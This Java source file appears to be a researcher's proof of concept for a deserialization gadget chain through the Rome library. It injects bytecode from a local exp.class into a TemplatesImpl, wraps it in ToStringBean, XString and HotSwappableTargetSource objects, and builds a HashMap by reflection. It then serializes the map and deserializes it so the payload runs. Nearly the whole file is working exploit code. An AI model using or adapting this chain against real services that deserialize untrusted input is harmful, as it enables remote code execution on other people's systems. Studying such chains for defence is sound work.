package Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/*
  ToStringBean#toString
  
  XString#equals
  HotSwappableTargetSource#equals
  HashMap#putVal
  HashMap#put
  HashMap#readObject
*/



public class Xtring {
    public static void main(String[] args) throws Exception {

        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));


        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "whatever");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);


        //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> map = new HashMap<>();

      //相当于执行了HashMap.put(v1,v1); HashMap.put(v2,v2);
        setFieldValue(map, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(map, "table", tbl);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
//        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
//        ois.close();
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
